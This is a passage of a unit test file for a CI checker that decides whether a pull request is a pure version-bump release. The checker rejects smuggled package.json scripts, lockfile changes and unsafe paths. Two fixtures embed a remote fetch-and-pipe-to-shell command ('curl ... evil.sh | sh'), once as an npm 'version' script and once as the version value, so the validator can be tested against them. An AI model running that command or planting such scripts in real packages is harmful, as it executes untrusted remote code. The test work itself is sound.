/**
 * Unit tests for the release-exception checkers in release-exception.js.
 *
 * Beyond the per-file checks, these also cover the PR-level rule that at
 * least one allowed version path must actually change before a PR can be
 * pure (a CHANGELOG-only PR and a formatting-only `package.json` are both
 * NOT pure, reason `no-version-bump`) and the `CONTENT_TOO_LARGE` and
 * `NOT_A_FILE` reader sentinels.
 *
 * `makeGetContentReader({ getContent, owner, repo })` is covered
 * separately against a stubbed `getContent` returning the real GitHub
 * Contents API response shapes (a file, an oversized file, a symlink, a
 * submodule, a directory array, a lone `type: 'dir'` object, a 404, and a
 * malformed response), pinning the entry-type handling the workflow's
 * `github-script` step wires up via this factory.
 *
 * `classify(paths)` (path-shape only) is covered against the exact
 * changed-file lists of PR #190 (understanding-gate 0.5.0, pure) and PR
 * #215 (grounding-mcp 0.11.0, NOT pure), captured via `gh pr view <n>
 * --repo LanNguyenSi/agent-grounding --json files` (read-only, no repo
 * state changed).
 *
 * `classifyPullFiles(files, { readFile, baseRef, headRef })` (status +
 * parsed-content aware) is covered two ways:
 *
 *   - The PURE assertions replay PR #190's real base/head file content,
 *     fetched read-only via `gh api
 *     repos/LanNguyenSi/agent-grounding/contents/<path>?ref=<sha>` (base
 *     `5dc0cbc048a6b59c35b0fbd1810cc20c7f88a28a`, head
 *     `663a19b4462f001c21252dbdf1a482d0a608247d`, both from `gh pr view 190
 *     --json baseRefOid,headRefOid`) and checked in under
 *     `scripts/fixtures/release-exception/`. `pr190-package-lock*.json` is
 *     TRIMMED from the real 8975-line lockfile down to its `name`,
 *     `version`, `lockfileVersion`, `requires`, and exactly the two
 *     `packages` entries this check reads (`""` and
 *     `packages/understanding-gate`), the other 627 workspace/
 *     `node_modules` entries carry no signal for this check and are
 *     dropped; the two kept files are otherwise byte-for-byte the real
 *     content. `pr190-package*.json` and `pr190-changelog*.md` are the
 *     real, untrimmed file content (small enough not to need it).
 *   - The NOT-pure and edge-case assertions use small synthetic in-memory
 *     JSON fixtures (a fake `readFile` closing over a `{ [ref]: { [path]:
 *     text } }` map), real PR content is unnecessary for isolating one
 *     disqualifying condition at a time.
 *
 * Uses Node's built-in test runner (`node --test`), matching this repo's
 * other root scripts.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const path = require('node:path');
const {
  classify,
  classifyPullFiles,
  isUnsafePath,
  isAllowedReleasePath,
  CONTENT_TOO_LARGE,
  NOT_A_FILE,
  makeGetContentReader,
} = require('./release-exception');

const SCRIPT_PATH = path.join(__dirname, 'release-exception.js');
const FIXTURE_DIR = path.join(__dirname, 'fixtures', 'release-exception');

function readFixture(name) {
  return fs.readFileSync(path.join(FIXTURE_DIR, name), 'utf8');
}

// PR #190's real base/head commit shas (`gh pr view 190 --repo
// LanNguyenSi/agent-grounding --json baseRefOid,headRefOid`).
const PR_190_BASE_REF = '5dc0cbc048a6b59c35b0fbd1810cc20c7f88a28a';
const PR_190_HEAD_REF = '663a19b4462f001c21252dbdf1a482d0a608247d';

const PR_190_CONTENT = {
  [PR_190_BASE_REF]: {
    'packages/understanding-gate/package.json': readFixture('pr190-package.base.json'),
    'packages/understanding-gate/CHANGELOG.md': readFixture('pr190-changelog.base.md'),
    'package-lock.json': readFixture('pr190-package-lock.trimmed.base.json'),
  },
  [PR_190_HEAD_REF]: {
    'packages/understanding-gate/package.json': readFixture('pr190-package.head.json'),
    'packages/understanding-gate/CHANGELOG.md': readFixture('pr190-changelog.head.md'),
    'package-lock.json': readFixture('pr190-package-lock.trimmed.head.json'),
  },
};

/**
 * Build a `readFile(ref, path)` from a `{ [ref]: { [path]: text } }` map;
 * an absent ref or path resolves to `null` (matching the real reader's
 * "absent at this ref" contract).
 */
function fakeReaderFrom(map) {
  return async (ref, filePath) => {
    const atRef = map[ref];
    if (!atRef || !(filePath in atRef)) return null;
    return atRef[filePath];
  };
}

// PR #190 (understanding-gate-v0.5.0), captured via `gh pr view 190
// --repo LanNguyenSi/agent-grounding --json files`.
const PR_190_FILES = [
  'package-lock.json',
  'packages/understanding-gate/CHANGELOG.md',
  'packages/understanding-gate/package.json',
];

// PR #215 (grounding-mcp-v0.11.0), captured the same way.
const PR_215_FILES = [
  'docs/okf/evidence-ledger-session-key-shapes.md',
  'docs/okf/grounding-stack-overview.md',
  'docs/okf/hypothesis-tracker-persistence-split.md',
  'docs/okf/log.md',
  'docs/okf/solution-acceptance-verdict-contract.md',
  'package-lock.json',
  'packages/grounding-mcp/CHANGELOG.md',
  'packages/grounding-mcp/package.json',
  'packages/grounding-mcp/src/server.ts',
];

test('PR #190 (understanding-gate 0.5.0): pure release', () => {
  const verdict = classify(PR_190_FILES);
  assert.equal(verdict.pure_release, true);
  assert.deepEqual(verdict.allowed.sort(), [...PR_190_FILES].sort());
  assert.deepEqual(verdict.rejected, []);
});

test('PR #215 (grounding-mcp 0.11.0): NOT pure, source + docs rejected by name', () => {
  const verdict = classify(PR_215_FILES);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.allowed.sort(), [
    'package-lock.json',
    'packages/grounding-mcp/CHANGELOG.md',
    'packages/grounding-mcp/package.json',
  ]);
  assert.deepEqual(
    verdict.rejected.sort(),
    [
      'docs/okf/evidence-ledger-session-key-shapes.md',
      'docs/okf/grounding-stack-overview.md',
      'docs/okf/hypothesis-tracker-persistence-split.md',
      'docs/okf/log.md',
      'docs/okf/solution-acceptance-verdict-contract.md',
      'packages/grounding-mcp/src/server.ts',
    ].sort(),
  );
});

test('negative control: an otherwise-pure list plus one .ts file is NOT pure', () => {
  const files = [
    'package.json',
    'package-lock.json',
    'CHANGELOG.md',
    'packages/grounding-mcp/src/server.ts',
  ];
  const verdict = classify(files);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.rejected, ['packages/grounding-mcp/src/server.ts']);
  assert.deepEqual(verdict.allowed.sort(), [
    'CHANGELOG.md',
    'package-lock.json',
    'package.json',
  ]);
});

test('nested package path (two segments) is rejected, not pure', () => {
  const verdict = classify(['packages/a/b/package.json']);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.rejected, ['packages/a/b/package.json']);
});

test('the workflow file alone is rejected, not pure', () => {
  const verdict = classify(['.github/workflows/merge-approval.yml']);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.rejected, ['.github/workflows/merge-approval.yml']);
});

test('empty file list is NOT pure', () => {
  const verdict = classify([]);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.allowed, []);
  assert.deepEqual(verdict.rejected, []);
});

test('a path with a ".." traversal segment is rejected, not pure', () => {
  const verdict = classify(['packages/../package.json']);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.rejected, ['packages/../package.json']);
});

test('a leading-slash (absolute) path is rejected, not pure', () => {
  const verdict = classify(['/package.json']);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.rejected, ['/package.json']);
});

test('classify() throws TypeError on a non-array input (caller bug, not a verdict)', () => {
  assert.throws(() => classify('package.json'), TypeError);
  assert.throws(() => classify(null), TypeError);
  assert.throws(() => classify(undefined), TypeError);
});

test('isUnsafePath / isAllowedReleasePath: exported helpers agree with classify()', () => {
  assert.equal(isUnsafePath('/etc/passwd'), true);
  assert.equal(isUnsafePath('a/../b'), true);
  assert.equal(isUnsafePath('package.json'), false);
  assert.equal(isAllowedReleasePath('package.json'), true);
  assert.equal(isAllowedReleasePath('packages/foo/package.json'), true);
  assert.equal(isAllowedReleasePath('packages/foo/bar/package.json'), false);
  assert.equal(isAllowedReleasePath('README.md'), false);
});

test('classify(): allowlist matching is case-sensitive (an uppercased shape is rejected)', () => {
  assert.equal(isAllowedReleasePath('PACKAGE.JSON'), false);
  assert.equal(isAllowedReleasePath('Package.json'), false);
  assert.equal(classify(['PACKAGE.JSON']).pure_release, false);
  assert.equal(classify(['Package.json']).pure_release, false);
  // Nested-package case, so a `PACKAGE_ALLOWLIST_PATTERN` regex mutated
  // with an `/i` flag (case-insensitive) is caught here even though the
  // root-level cases above are checked by strict `Array.includes`
  // equality, not the regex, and would not be affected by that mutation.
  assert.equal(isAllowedReleasePath('packages/foo/PACKAGE.JSON'), false);
  assert.equal(classify(['packages/foo/Package.json']).pure_release, false);
});

test('classify(): a leading "./" form of an otherwise-allowed path is rejected', () => {
  const verdict = classify(['./package.json']);
  assert.equal(verdict.pure_release, false);
  assert.deepEqual(verdict.rejected, ['./package.json']);
});

test('classify(): any number of packages in one pure list is still pure (not capped at one)', () => {
  const files = [
    'package.json',
    'packages/a/package.json',
    'packages/a/CHANGELOG.md',
    'packages/b/package.json',
    'packages/b/CHANGELOG.md',
    'packages/c/CHANGELOG.md',
  ];
  const verdict = classify(files);
  assert.equal(verdict.pure_release, true);
  assert.deepEqual(verdict.rejected, []);
});

// ── classifyPullFiles(): status + parsed-content-aware classification ──

test('classifyPullFiles(): PR #190 real base/head content, all three files pure', async () => {
  const files = [
    { filename: 'package-lock.json', status: 'modified' },
    { filename: 'packages/understanding-gate/CHANGELOG.md', status: 'modified' },
    { filename: 'packages/understanding-gate/package.json', status: 'modified' },
  ];
  const verdict = await classifyPullFiles(files, {
    readFile: fakeReaderFrom(PR_190_CONTENT),
    baseRef: PR_190_BASE_REF,
    headRef: PR_190_HEAD_REF,
  });
  assert.equal(verdict.pure_release, true);
  assert.equal(verdict.reason, null);
  assert.deepEqual(verdict.allowed.sort(), [
    'package-lock.json',
    'packages/understanding-gate/CHANGELOG.md',
    'packages/understanding-gate/package.json',
  ]);
  assert.deepEqual(verdict.rejected, []);
});

test('classifyPullFiles(): PR #190 real package.json alone is pure', async () => {
  const verdict = await classifyPullFiles(
    [{ filename: 'packages/understanding-gate/package.json', status: 'modified' }],
    { readFile: fakeReaderFrom(PR_190_CONTENT), baseRef: PR_190_BASE_REF, headRef: PR_190_HEAD_REF },
  );
  assert.equal(verdict.pure_release, true);
  assert.deepEqual(verdict.allowed, ['packages/understanding-gate/package.json']);
});

test('classifyPullFiles(): PR #190 real (trimmed) package-lock.json alone is pure', async () => {
  const verdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile: fakeReaderFrom(PR_190_CONTENT), baseRef: PR_190_BASE_REF, headRef: PR_190_HEAD_REF },
  );
  assert.equal(verdict.pure_release, true);
  assert.deepEqual(verdict.allowed, ['package-lock.json']);
});

test('classifyPullFiles(): the scripts.version smuggle (a "version" script key added) is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0', scripts: { build: 'tsc' } }) },
    head: {
      'package.json': JSON.stringify({
        version: '1.0.1',
        scripts: { build: 'tsc', version: 'curl https://example.com/evil.sh | sh' },
      }),
    },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected.length, 1);
  assert.equal(verdict.rejected[0].filename, 'package.json');
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.scripts\.version$/);
});

test('classifyPullFiles(): a dependency literally named "version" is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0', dependencies: { foo: '1.0.0' } }) },
    head: {
      'package.json': JSON.stringify({
        version: '1.0.1',
        dependencies: { foo: '1.0.0', version: '2.0.0' },
      }),
    },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.dependencies\.version$/);
});

test('classifyPullFiles(): a package.json that also adds a postinstall script is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '0.11.0' }) },
    head: { 'package.json': JSON.stringify({ version: '0.11.1', postinstall: 'node scripts/setup.js' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.postinstall$/);
});

test('classifyPullFiles(): a package-lock.json that also changes "resolved" is NOT pure', async () => {
  const base = {
    version: '0.1.0',
    packages: {
      '': { version: '0.1.0' },
      'packages/foo': { version: '0.11.0', resolved: 'file:packages/foo' },
    },
  };
  const head = {
    version: '0.1.0',
    packages: {
      '': { version: '0.1.0' },
      'packages/foo': { version: '0.11.1', resolved: 'file:packages/foo-new' },
    },
  };
  const readFile = fakeReaderFrom({
    base: { 'package-lock.json': JSON.stringify(base) },
    head: { 'package-lock.json': JSON.stringify(head) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.packages\["packages\/foo"\]\.resolved$/);
});

test('classifyPullFiles(): an added dependency key is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0', dependencies: { a: '1.0.0' } }) },
    head: {
      'package.json': JSON.stringify({
        version: '1.0.1',
        dependencies: { a: '1.0.0', b: '2.0.0' },
      }),
    },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.dependencies\.b$/);
});

test('classifyPullFiles(): a removed key is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0', description: 'foo' }) },
    head: { 'package.json': JSON.stringify({ version: '1.0.1' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.description$/);
});

test('classifyPullFiles(): an array change under the allowed path is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0', files: ['dist'] }) },
    head: { 'package.json': JSON.stringify({ version: '1.0.1', files: ['dist', 'README.md'] }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^disallowed-json-path:\$\.files$/);
});

test('classifyPullFiles(): a version value that is not semver ("^0.1.2") is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '0.1.1' }) },
    head: { 'package.json': JSON.stringify({ version: '^0.1.2' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^non-semver-value:\$\.version$/);
});

test('classifyPullFiles(): a version value that is a shell command is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0' }) },
    head: { 'package.json': JSON.stringify({ version: 'curl https://example.com/evil.sh | sh' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(verdict.rejected[0].reason, /^non-semver-value:\$\.version$/);
});

test('classifyPullFiles(): a version bump on a disallowed lockfile path (node_modules entry) is NOT pure', async () => {
  const base = {
    version: '0.1.0',
    packages: { '': { version: '0.1.0' }, 'node_modules/x': { version: '1.0.0' } },
  };
  const head = {
    version: '0.1.0',
    packages: { '': { version: '0.1.0' }, 'node_modules/x': { version: '1.0.1' } },
  };
  const readFile = fakeReaderFrom({
    base: { 'package-lock.json': JSON.stringify(base) },
    head: { 'package-lock.json': JSON.stringify(head) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.match(
    verdict.rejected[0].reason,
    /^disallowed-json-path:\$\.packages\["node_modules\/x"\]\.version$/,
  );
});

test('classifyPullFiles(): an unparsable (invalid-JSON) file is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': '{ not valid json' },
    head: { 'package.json': JSON.stringify({ version: '1.0.1' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'parse-error-base');
});

test('classifyPullFiles(): an unparsable head content is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': JSON.stringify({ version: '1.0.0' }) },
    head: { 'package.json': '{ not valid json' },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'parse-error-head');
});

test('classifyPullFiles(): a non-object JSON root (array) is NOT pure', async () => {
  const readFile = fakeReaderFrom({
    base: { 'package.json': '["not", "an", "object"]' },
    head: { 'package.json': JSON.stringify({ version: '1.0.1' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'non-object-root-base');
});

test('classifyPullFiles(): an added package.json has no base content, so it is NOT pure', async () => {
  // readFile returns null for the base ref: the file did not exist there.
  const readFile = fakeReaderFrom({
    head: { 'package.json': JSON.stringify({ version: '1.0.0' }) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'added' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'missing-base');
});

test('classifyPullFiles(): a readFile that throws is NOT pure (fail-closed, not a crash)', async () => {
  const readFile = async (ref) => {
    if (ref === 'base') throw new Error('network blip');
    return JSON.stringify({ version: '1.0.1' });
  };
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'reader-error-base');
});

test('classifyPullFiles(): a CHANGELOG-only PR passes path/status without reading content, but is NOT pure: nothing was bumped', async () => {
  const readFile = async () => {
    throw new Error('readFile must not be called for a CHANGELOG.md entry');
  };
  const verdict = await classifyPullFiles(
    [{ filename: 'CHANGELOG.md', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  // Path and status pass (the entry lands in `allowed`, and the throwing
  // reader was never called: CHANGELOG.md carries no content constraint),
  // but no allowed version path changed anywhere in the PR, so the PR as a
  // whole is not a release and the five labels are not waived.
  assert.deepEqual(verdict.allowed, ['CHANGELOG.md']);
  assert.deepEqual(verdict.rejected, []);
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.reason, 'no-version-bump');
});

test('classifyPullFiles(): a package.json whose parsed content is identical (whitespace/key order only) is NOT pure', async () => {
  // Same document, different formatting and key order: `JSON.parse` makes
  // the two sides equal, so there are no differing paths to reject, and
  // without the "at least one real bump" rule this would pass by emptiness.
  const readFile = fakeReaderFrom({
    base: { 'package.json': '{"name":"x","version":"1.0.0"}' },
    head: { 'package.json': '{\n  "version": "1.0.0",\n  "name": "x"\n}\n' },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.deepEqual(verdict.allowed, ['package.json']);
  assert.deepEqual(verdict.rejected, []);
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.reason, 'no-version-bump');
});

test('classifyPullFiles(): a lockfile bump at a NESTED packages path is NOT pure (one segment only)', async () => {
  // `packages/a/b` is not a workspace shape this repo has; the allowed
  // lockfile path regex permits exactly one segment under `packages/`.
  const base = {
    version: '0.1.0',
    packages: { '': { version: '0.1.0' }, 'packages/a/b': { version: '1.0.0' } },
  };
  const head = {
    version: '0.1.0',
    packages: { '': { version: '0.1.0' }, 'packages/a/b': { version: '1.0.1' } },
  };
  const readFile = fakeReaderFrom({
    base: { 'package-lock.json': JSON.stringify(base) },
    head: { 'package-lock.json': JSON.stringify(head) },
  });
  const verdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.reason, 'rejected-files');
  assert.equal(
    verdict.rejected[0].reason,
    'disallowed-json-path:$.packages["packages/a/b"].version',
  );
});

test('classifyPullFiles(): a reader signalling CONTENT_TOO_LARGE is NOT pure, with its own named reason', async () => {
  // The Contents API inlines at most 1 MB; above that it answers with
  // empty content and `encoding: "none"`, which the workflow's reader
  // reports as this sentinel rather than as an absent file.
  const baseTooLarge = async (ref) =>
    (ref === 'base' ? CONTENT_TOO_LARGE : JSON.stringify({ version: '1.0.1' }));
  const baseVerdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile: baseTooLarge, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(baseVerdict.pure_release, false);
  assert.equal(baseVerdict.rejected[0].reason, 'content-too-large-base');

  const headTooLarge = async (ref) =>
    (ref === 'head' ? CONTENT_TOO_LARGE : JSON.stringify({ version: '1.0.0' }));
  const headVerdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile: headTooLarge, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(headVerdict.pure_release, false);
  assert.equal(headVerdict.rejected[0].reason, 'content-too-large-head');
});

test('classifyPullFiles(): a reader signalling NOT_A_FILE (symlink/submodule) is NOT pure, with its own named reason', async () => {
  // GitHub's Contents API returns a symlink or submodule entry without
  // base64 content, same as an oversized file; the reader has to tell
  // those two shapes apart so the step summary names the real cause
  // instead of reporting "too large" for a path that is not a file at
  // all.
  const baseNotAFile = async (ref) =>
    (ref === 'base' ? NOT_A_FILE : JSON.stringify({ version: '1.0.1' }));
  const baseVerdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile: baseNotAFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(baseVerdict.pure_release, false);
  assert.equal(baseVerdict.rejected[0].reason, 'not-a-file-base');

  const headNotAFile = async (ref) =>
    (ref === 'head' ? NOT_A_FILE : JSON.stringify({ version: '1.0.0' }));
  const headVerdict = await classifyPullFiles(
    [{ filename: 'package-lock.json', status: 'modified' }],
    { readFile: headNotAFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(headVerdict.pure_release, false);
  assert.equal(headVerdict.rejected[0].reason, 'not-a-file-head');
});

// `makeGetContentReader` against stubbed real Contents API response
// shapes (github.rest.repos.getContent's actual return shape, per
// https://docs.github.com/en/rest/repos/contents): the reader extracted
// out of the workflow's `github-script` step so these entry-type
// distinctions are unit-testable, not only reachable through a bare
// sentinel handed straight to the classifier.

function readerWith(getContent) {
  return makeGetContentReader({ getContent, owner: 'o', repo: 'r' });
}

test('makeGetContentReader(): a type:"file" response with base64 content reads as the file text', async () => {
  const getContent = async ({ path: filePath, ref }) => ({
    data: {
      type: 'file',
      encoding: 'base64',
      content: Buffer.from(`content of ${filePath}@${ref}`, 'utf8').toString('base64'),
    },
  });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'package.json'), 'content of package.json@sha1');
});

test('makeGetContentReader(): a type:"file" response with encoding:"none" (over the 1 MB inline ceiling) is CONTENT_TOO_LARGE', async () => {
  const getContent = async () => ({ data: { type: 'file', encoding: 'none', content: '' } });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'package-lock.json'), CONTENT_TOO_LARGE);
});

test('makeGetContentReader(): a type:"symlink" response (with a target field) is NOT_A_FILE', async () => {
  // Shape GitHub answers with when the symlink's target is NOT a normal
  // file in this repository (an external or dangling target); see the
  // resolved-in-repo-symlink test below for the other shape.
  const getContent = async () => ({
    data: { type: 'symlink', target: '../outside-repo/version.json' },
  });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'package.json'), NOT_A_FILE);
});

test('makeGetContentReader(): a symlink the API resolved to a normal in-repo file reads as that file (type:"file", not NOT_A_FILE)', async () => {
  // Per GitHub's Contents API docs, a symlink whose target is a normal
  // file in the same repository comes back with the TARGET file's own
  // content and type:'file', not a symlink-shaped object. Pinning this
  // documents that the reader deliberately does not special-case it.
  const getContent = async () => ({
    data: {
      type: 'file',
      encoding: 'base64',
      content: Buffer.from('{"version":"1.0.1"}', 'utf8').toString('base64'),
    },
  });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'package.json'), '{"version":"1.0.1"}');
});

test('makeGetContentReader(): a type:"submodule" response (with a submodule_git_url field) is NOT_A_FILE', async () => {
  const getContent = async () => ({
    data: { type: 'submodule', submodule_git_url: 'https://example.com/other.git' },
  });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'packages/x/package.json'), NOT_A_FILE);
});

test('makeGetContentReader(): a directory (array) response is null', async () => {
  const getContent = async () => ({ data: [{ type: 'file', name: 'a' }, { type: 'dir', name: 'b' }] });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'packages'), null);
});

test('makeGetContentReader(): a lone type:"dir" single-object response is NOT_A_FILE (pinned, fail-closed)', async () => {
  // Not an observed real shape for a single-path getContent call (a
  // directory normally comes back as an array, see the test above), but
  // the `type !== 'file'` check covers it the same as a symlink or a
  // submodule if it ever occurs, and this pins that choice deliberately
  // rather than leaving it as an untested fall-through.
  const getContent = async () => ({ data: { type: 'dir', name: 'packages' } });
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'packages'), NOT_A_FILE);
});

test('makeGetContentReader(): a 404 from getContent is null', async () => {
  const getContent = async () => {
    const err = new Error('Not Found');
    err.status = 404;
    throw err;
  };
  const readFile = readerWith(getContent);
  assert.equal(await readFile('sha1', 'package.json'), null);
});

test('makeGetContentReader(): a non-404 getContent error propagates (fail-closed via the caller, not swallowed here)', async () => {
  const getContent = async () => {
    const err = new Error('rate limited');
    err.status = 403;
    throw err;
  };
  const readFile = readerWith(getContent);
  await assert.rejects(() => readFile('sha1', 'package.json'), /rate limited/);
});

test('makeGetContentReader(): a malformed response (res.data missing) throws rather than reading as absent (fail-closed via the caller)', async () => {
  const getContent = async () => ({});
  const readFile = readerWith(getContent);
  await assert.rejects(() => readFile('sha1', 'package.json'));
});

test('classifyPullFiles(): the extracted reader\'s NOT_A_FILE for a symlink flows through to the same named reason as the sentinel-level test', async () => {
  const symlinkThenFile = async ({ path: filePath, ref }) => {
    if (ref === 'base') return { data: { type: 'symlink', target: 'elsewhere' } };
    return {
      data: {
        type: 'file',
        encoding: 'base64',
        content: Buffer.from(JSON.stringify({ version: '1.0.1' }), 'utf8').toString('base64'),
      },
    };
  };
  const readFile = readerWith(symlinkThenFile);
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'not-a-file-base');
});

test('classifyPullFiles(): the extracted reader\'s NOT_A_FILE for a submodule flows through to the same named reason as the sentinel-level test', async () => {
  const fileTheSubmodule = async ({ path: filePath, ref }) => {
    if (ref === 'head') return { data: { type: 'submodule', submodule_git_url: 'https://example.com/x.git' } };
    return {
      data: {
        type: 'file',
        encoding: 'base64',
        content: Buffer.from(JSON.stringify({ version: '1.0.0' }), 'utf8').toString('base64'),
      },
    };
  };
  const readFile = readerWith(fileTheSubmodule);
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'not-a-file-head');
});

test('classifyPullFiles(): a rename into an allowlisted CHANGELOG.md path is NOT pure', async () => {
  const readFile = async () => {
    throw new Error('readFile must not be called for a rejected-by-status entry');
  };
  const verdict = await classifyPullFiles(
    [{ filename: 'packages/x/CHANGELOG.md', status: 'renamed', previous_filename: 'packages/x/HISTORY.md' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].filename, 'packages/x/CHANGELOG.md');
  assert.equal(verdict.rejected[0].reason, 'disallowed-status:renamed');
});

test('classifyPullFiles(): a removed package.json is NOT pure', async () => {
  const readFile = async () => {
    throw new Error('readFile must not be called for a rejected-by-status entry');
  };
  const verdict = await classifyPullFiles(
    [{ filename: 'package.json', status: 'removed' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected[0].reason, 'disallowed-status:removed');
});

test('classifyPullFiles(): a missing or non-string filename is rejected with a named reason', async () => {
  const readFile = async () => {
    throw new Error('readFile must not be called for an invalid-filename entry');
  };
  const verdict = await classifyPullFiles(
    [{ status: 'modified' }, { filename: 42, status: 'modified' }],
    { readFile, baseRef: 'base', headRef: 'head' },
  );
  assert.equal(verdict.pure_release, false);
  assert.equal(verdict.rejected.length, 2);
  for (const entry of verdict.rejected) {
    assert.equal(entry.filename, null);
